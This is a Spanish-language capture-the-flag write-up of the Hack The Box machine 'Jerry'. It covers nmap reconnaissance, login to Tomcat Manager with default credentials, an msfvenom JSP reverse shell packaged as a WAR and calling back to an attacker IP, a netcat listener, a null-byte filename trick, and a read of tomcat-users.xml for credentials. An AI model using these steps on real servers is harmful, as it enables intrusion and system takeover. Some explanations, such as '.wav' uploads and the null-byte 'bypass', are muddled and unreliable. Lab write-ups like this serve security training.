---
layout: single
title: Jerry - Hack The Box
excerpt: "Mediante unas credenciales obtenidas accederemos a la gestión del servidor y subiremos mediante técnicas una rever shell, que nos dara privilegios como autoridad del sistema."
date: 2025-10-01
classes: wide
header:
  teaser: /assets/images/htb-writeup-jerry/logo_jerry.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - Hackthebox
  - Pentesting
  - eJPTv2
tags:
  - writeup
  - eJPTv2
  - HackingWeb
  - InformationLekeage
  - FileUpload
  - AbusingFileUploadNullByte
  - RemoteAccessRCE
  - ReverseShell
  - EscaladaPrivilegios
---

![](/assets/images/htb-writeup-jerry/logo_jerry.png)


## WRITE UP
IP VÍCTIMA: 10.10.10.95 (víctima) TTL= 127 WINDOWS


### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Jerry</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**


Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

![](/assets/images/htb-writeup-jerry/whichsystem_jerry.png)


-Usar el comando *ping*:

```bash
ping -c1 10.10.10.95 -R
# -R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición, en este caso de Windows no lo muestra.
```

![](/assets/images/htb-writeup-jerry/conectividad_jerry.png)


Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.10.95 -oG allPorts
# Veremos porque el formato grepeable, es importante.
```

![](/assets/images/htb-writeup-jerry/nmap1_jerry.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

```bash
extractports.sh allPorts
```

![](/assets/images/htb-writeup-jerry/extractports_jerry.png)

```bash
nmap -sVC -p8080 10.10.10.95 -oN targeted 
#  El formato -oN lo emplearemos con batcat lenguaje java para verlo mejor
#  Nos mostrará la versión de los servicios que están corriendo
#  Usará scripts defaults definidos en lua
```

![](/assets/images/htb-writeup-jerry/nmap2_jerry.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

```bash
batcat targeted -l java
# Nos mostrara la salida en un formato más bonito, con java
```

![](/assets/images/htb-writeup-jerry/batcat_jerry.png)


### ANÁLISIS WEB: RECONOCIMIENTO


Con *whatweb* haremos un pequeño reconocimiento a nivel web para sacar más información, como la extensión <span style="color:lightyellow">Wappalyzer</span> pero por consola.

```bash
whatweb http://10.10.10.95:8080/
```

![](/assets/images/htb-writeup-jerry/whatweb_jerry.png)


Entraremos a la página por el <span style="color:purple">puerto 8080</span>. Veremos que se trata de <span style="color:yellow">Apache Tomcat v7.0.88</span>

![](/assets/images/htb-writeup-jerry/paginatom_jerry.png)


Con la extensión de <span style="color:lightyellow">Wappalyzer</span> veremos las tecnologías de las páginas.

![](/assets/images/htb-writeup-jerry/wappalyzer_jerry.png)


### CREDENCIALES SENSIBLES FILTRADAS

Le damos a "**Manager App**" donde nos saldrá para introducir unas credenciales. 
Como carecemos de credenciales, le damos a **cancelar**.

![](/assets/images/htb-writeup-jerry/credtom_jerry.png)


Nos llevara al siguiente mensaje de código cual nos dice que no estamos autorizados.
Nos dice que hay credenciales en el fichero <span style="color:lightblue">conf/</span>**tomcat-users.xml** y nos da aparte unas posibles credenciales para loguearse: <span style="color:blue">tomcat</span>:<span style="color:darkred">s3cret</span>


![](/assets/images/htb-writeup-jerry/401_jerry.png)


Probamos las crdenciales.

![](/assets/images/htb-writeup-jerry/intcred_jerry.png)


Nos deja acceder a un panel donde podemos subir archivos comprimidos <span style="color:grey">.wav</span>

![](/assets/images/htb-writeup-jerry/pagplu_jerry.png)


### SUBIDA DE ARCHIVO MALICIOSA .wav 

Información acerca la extensión:
[WAR extensión](> https://es.wikipedia.org/wiki/WAR_(archivo))


Como tenemos una subida de archivos al servidor, vamos a ver si la podemos explotar para ejecutar un **RCE**.

![](/assets/images/htb-writeup-jerry/pagplu_jerry.png)


### CONFIGURACIÓN REVERSE SHELL .jsp

Nos pondremos en escucha con *netcat* por el <span style="color:purple">puerto 444</span>.

```bash
nc -nvlp 444
```

![](/assets/images/htb-writeup-jerry/confnc_jerry.png)


Usaremos *msfvenom* para crear nuestra <span style="color:lime">reverse shell</span> y subirlo al servidor.
Hay dos formas que veremos más adelante.

Crearemos una reverse Shell en formato comprimido **war** , para poder hacerlo más compatible en formato <span style="color:grey">.jsp</span> . Usaremos un metodo para bypassear la autenticación llamada <span style="color:cyan">Null Byte</span>, lo veremos:. 

```bash
sudo msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.8.177.73 LPORT=444 -e x86/shikata_ga_nai -f war -o shell.jsp
```

![](/assets/images/htb-writeup-jerry/venom_jerry.png)


Miramos de que formato es el archivo:

```bash
file shell.war
```

Nos dice que esta en formato de un compromible.

![](/assets/images/htb-writeup-jerry/war_jerry.png)

En la sección hay que subirlo.

![](/assets/images/htb-writeup-jerry/subida_jerry.png)


Aquí un ejemplo de que pasa si lo subimos sin formato <span style="color:grey">.war</span>

![](/assets/images/htb-writeup-jerry/nullb_jerry.png)


Le damos a "**Deploy**".

![](/assets/images/htb-writeup-jerry/selec_jerry.png)


Nos dice que no se ha subido el archivo debido a que no es un <span style="color:grey">.war</span>

![](/assets/images/htb-writeup-jerry/subd_jerry.png)


### NULL BYTE: BYPASSEAR PROTOCOLO

1) La pirmera forma consiste mediante la técnica de **null byte** es bypassear el protocolo que detecta si es de una cierta extensión el archivo en el servidor es agregar **%00** al final del archivo y añadir el formato real.

``.jsp%00.war``

![](/assets/images/htb-writeup-jerry/cp_jerry.png)

![](/assets/images/htb-writeup-jerry/nb_jerry.png)


![](/assets/images/htb-writeup-jerry/tiparch_jerry.png)

La subimos.

![](/assets/images/htb-writeup-jerry/subidanb_jerry.png)


Le damos a "**Deploy**".

![](/assets/images/htb-writeup-jerry/subnb2_jerry.png)


Vemos que nos dice OK y se ha subido correctamente.

![](/assets/images/htb-writeup-jerry/succupl_jerry.png)


2) La segunda forma es crear una reverse Shell directamente en dicho formato para que nos deje subirlo.

```bash
sudo “msfvenom” -p java/jsp_shell_reverse_tcp LHOST=10.8.177.73 LPORT=444 -e x86/shikata_ga_nai -f war -o shell.war
```

![](/assets/images/htb-writeup-jerry/venom2_jerry.png)


Pinchamos en el nombre para ejecutarlo.

1)
![](/assets/images/htb-writeup-jerry/1ejcrb_jerry.png)

2)
![](/assets/images/htb-writeup-jerry/2ejcrv_jerry.png)


Se quedará en blanco la página.

![](/assets/images/htb-writeup-jerry/cargrv_jerry.png)

![](/assets/images/htb-writeup-jerry/cargrv2_jerry.png)


### ESCALADA DE PRIVILEGIOS

Recibiremos la conexión víctima a nuestro host y estaremos como <span style="color:blue">nt authority\system</span>, así que tenemos privilegios sobre el sistema, por lo que nos podemos meter en los homes de los usuarios.

```bash
whoami
```

![](/assets/images/htb-writeup-jerry/rechostnc_jerry.png)

### CREDENCIALES: PASO OPCIONAL
Si nos vamos a la ruta del mensaje del principio, tendremos las contraseñas de <span style="color:blue">admin tomcat jerry</span>.

![](/assets/images/htb-writeup-jerry/noauth_jerry.png)


```bash
type C:\apache-tomcat-7.0.88\conf\tomcat-users.xml
```

![](/assets/images/htb-writeup-jerry/usersadmincred_jerry.png)


### BANDERAS USER y ROOT

Para  coger las banderas nos iremos al directorio root. Está entre " "

``type "2 for the price of 1.txt"``

![](/assets/images/htb-writeup-jerry/flaguserroot_jerry.png)
